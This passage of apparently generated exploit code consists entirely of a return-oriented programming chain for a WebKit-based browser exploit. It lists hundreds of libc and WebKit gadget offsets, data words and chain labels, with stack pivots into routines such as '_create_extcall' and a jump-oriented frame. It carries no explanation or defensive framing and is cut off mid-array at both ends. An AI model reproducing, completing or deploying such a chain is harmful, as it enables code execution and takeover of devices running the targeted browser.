libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2203:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2204:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+152136, //L2208
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+152104, //L2206
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+152120, //L2207
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2206:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2207:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2208:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+152208, //L2210
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2210:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+152264, //L2211
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2211:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+152360, //L2214
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2213:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L2214:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+152448, //L2216
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+152464, //L2217
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2216:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2217:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+152616, //L2220
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+152648, //L2222
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+152600, //L2219
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+152632, //L2221
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2219:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2220:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2221:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2222:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+152768, //L2224
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+152784, //L2225
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+152752, //L2223
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2223:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2224:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2225:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+152872, //L2227
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2227:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+152928, //L2228
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2228:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+153016, //L2231
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2230:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+792472,); //pop rcx
//L2231:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2233:
db([40, 0]); // 0x28
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+153144, //L2235
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+153160, //L2236
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2235:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2236:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+153304, //L2240
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+153272, //L2238
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+153288, //L2239
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2238:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2239:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2240:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+153400, //L2242
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2241:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L2242:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+153488, //L2244
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+153504, //L2245
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2244:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2245:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+153648, //L2249
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+153616, //L2247
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+153632, //L2248
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2247:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2248:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2249:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+153720, //L2251
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2251:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+153776, //L2252
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2252:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+153872, //L2255
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2254:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L2255:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+153960, //L2257
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+153976, //L2258
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2257:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2258:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+154128, //L2261
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+154160, //L2263
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+154112, //L2260
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+154144, //L2262
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2260:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2261:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2262:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2263:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+154280, //L2265
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+154296, //L2266
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+154264, //L2264
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2264:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2265:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2266:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+154384, //L2268
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2268:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+154440, //L2269
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2269:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+154536, //L2272
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2272:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+154592, //L2273
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2273:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2275:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L2276:
db([16, 0]); // 0x10
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+154744, //L2278
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2278:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+154800, //L2279
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2279:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+154920, //L2282
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2281:
db([32, 0]); // 0x20
set_gadget(libc_base+792472,); //pop rcx
//L2282:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+155008, //L2284
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155024, //L2285
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2284:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2285:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+155168, //L2289
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+155136, //L2287
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155152, //L2288
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2287:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2288:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2289:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+155264, //L2291
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2290:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+792472,); //pop rcx
//L2291:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+155352, //L2293
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155368, //L2294
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2293:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2294:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+155512, //L2298
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+155480, //L2296
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155496, //L2297
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2296:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2297:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2298:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2300:
ropchain+155616, //L2299
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+86472, //_create_extcall
//L2299:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967264, 4294967295]); // -0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+155704, //L2302
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2301:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+792472,); //pop rcx
//L2302:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+155792, //L2304
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155808, //L2305
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2304:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2305:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+155952, //L2309
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+155920, //L2307
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155936, //L2308
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2307:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2308:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2309:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2310:
jop_frame_addr,
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+156096, //L2312
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2311:
db([24, 0]); // 0x18
set_gadget(libc_base+792472,); //pop rcx
//L2312:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+156184, //L2314
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+156200, //L2315
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2314:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2315:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+156344, //L2319
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+156312, //L2317
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+156328, //L2318
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2317:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2318:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2319:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+156440, //L2321
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2320:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2321:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+156528, //L2323
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+156544, //L2324
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2323:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2324:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+156688, //L2328
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+156656, //L2326
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+156672, //L2327
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2326:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2327:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2328:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2330:
ropchain+156792, //L2329
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+157624, //L2331
//L2329:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967264, 4294967295]); // -0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+156928, //L2333
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+156944, //L2334
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+156912, //L2332
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2332:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2333:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2334:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+157064, //L2336
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+157080, //L2337
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+157048, //L2335
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2335:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2336:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2337:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+157176, //L2338
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+157192, //L2339
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2338:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2339:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+157304, //L2340
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+157288, //L2341
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2341:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2340:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+157392, //L2343
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+157376, //L2342
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2342:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2343:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+157488, //L2344
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+157504, //L2345
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2344:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2345:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+157616, //L2346
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+157600, //L2347
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2347:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2346:
db([0, 0]); // 0x0
//L2331:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
